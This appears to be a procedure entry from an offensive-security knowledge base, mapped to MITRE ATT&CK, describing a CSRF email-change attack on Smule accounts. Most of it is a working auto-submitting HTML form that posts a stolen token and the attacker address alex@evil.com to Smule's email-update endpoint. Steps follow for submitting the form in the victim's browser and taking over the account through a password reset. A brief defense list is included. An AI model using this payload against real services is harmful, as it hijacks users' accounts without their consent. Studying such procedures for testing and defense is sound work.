---
id: proc-smule-csrf-takeover-001
name: Perform-CSRF-Email-Update-for-Account-Takeover
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.333Z'
tactics:
  - '[[Persistence]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - csrf
  - account-takeover
commands:
  - '[[commands/auto-submit-email-update-form]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: critical
detection_risk: high
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---

# Perform-CSRF-Email-Update-for-Account-Takeover

## Summary

This procedure uses the disclosed CSRF token to craft an auto-submitting HTML form that POSTs to Smule's /user/update/email endpoint, changing the victim's email to an attacker-controlled address and enabling full account takeover via password reset.

## Description

With the captured authenticity_token (CSRF), the attacker creates a malicious HTML page hosted on their server or loaded locally. The form includes the token, new email (attacker's), confirmation, and timezone offset, then auto-submits via JavaScript. Since the token validates the request, the update succeeds, allowing the attacker to claim the account by resetting the password to the new email.

## Requirements

1. Captured CSRF token from previous disclosure
2. Victim's session context (form submits in browser with cookies)
3. Attacker email address for takeover (e.g., alex@evil.com)

## Defense

Defensive measures and detection strategies:

- Bind CSRF tokens to specific actions/endpoints and short expiration
- Require re-authentication for sensitive changes like email updates
- Monitor for rapid successive updates or anomalous token usage

## Objectives

1. Bypass CSRF protection using stolen token
2. Update victim email to attacker control
3. Achieve persistence via account takeover

## Instructions

### Step 1: Prepare HTML Form

**Context**: Create the form with captured token and attacker email.

**Command** ([[commands/auto-submit-email-update-form]]):
```html
<!DOCTYPE html>
<head>
</head>
<body>
<form method="POST" action="https://www.smule.com/user/update/email">
<input type="hidden" name="utf-8" value="">
<input type="hidden" name="authenticity_token" value="{CSRF_TOKEN obtained previously}">
<input type="hidden" name="email" value="alex@evil.com">
<input type="hidden" name="email_confirmation" value="alex@evil.com">
<input type="hidden" name="tz_offset" value="19800">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

> Replace {CSRF_TOKEN} with captured value. Expected output: Form ready for submission.

### Step 2: Load and Submit

**Context**: Open the HTML in a browser with victim cookies (e.g., via proxy or extension).

No command; open file in browser or host and navigate.

> JavaScript auto-submits. Expected output: POST to Smule with 200 OK and success message.

### Step 3: Verify Takeover

**Context**: Check if email updated and reset password.

No command; log in with new email or monitor account.

> Success: Attacker receives reset link and controls account.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/auto-submit-email-update-form]]

## Tools Used


## Tags

- [[csrf]]
- [[account-takeover]]
